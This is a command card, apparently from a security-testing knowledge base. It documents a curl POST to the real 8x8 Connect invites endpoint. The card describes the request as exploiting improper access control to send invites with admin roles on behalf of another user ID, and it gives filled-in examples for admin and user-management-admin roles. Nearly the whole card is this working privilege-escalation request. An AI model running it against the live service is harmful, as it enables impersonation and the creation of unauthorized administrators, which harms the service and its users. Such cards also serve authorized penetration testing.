---
id: cmd-curl-post-invite-001
data: >-
  curl -X POST https://connect.8x8.com/api/v1/users/<User ID>/invites -H
  "Authorization: Bearer <token>" -H "Content-Type: application/json" -d
  '{"email": "example.com", "role": "admin"}'
tags:
  - api-testing
  - http-request
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2024-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:47.038Z'
verified: false
validated: true
submitted: true
---
# curl-post-invite

## Command

```bash
curl -X POST https://connect.8x8.com/api/v1/users/<User ID>/invites \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d '{"email": "example.com", "role": "admin"}'
```

## Description

This command sends a POST request to the 8x8 Connect API to create a user invite on behalf of a specified User ID, exploiting improper access control. Use it to test impersonation by replacing <User ID> and <token> with actual values.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method | Yes |
| `https://connect.8x8.com/api/v1/users/<User ID>/invites` | Target endpoint with User ID | Yes |
| `-H "Authorization: Bearer <token>"` | Admin authentication header | Yes |
| `-H "Content-Type: application/json"` | Sets JSON payload type | Yes |
| `-d '{"email": "example.com", "role": "admin"}'` | Invite details (customize email and role) | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://connect.8x8.com/api/v1/users/123/invites \
  -H "Authorization: Bearer eyJ0..." \
  -H "Content-Type: application/json" \
  -d '{"email": "test@example.com", "role": "admin"}'
```

### Advanced Usage

```bash
curl -X POST https://connect.8x8.com/api/v1/users/456/invites \
  -H "Authorization: Bearer eyJ0..." \
  -H "Content-Type: application/json" \
  -d '{"email": "restricted@example.com", "role": "user-management-admin"}'
```

## Expected Output

Successful execution returns a JSON response like {"id": "invite-uuid", "status": "sent"}, indicating the invite was created. Errors (e.g., 403) suggest authorization is enforced.

## Related

- [[Related Procedure: Test Invite Sending on Behalf of Another Admin]]
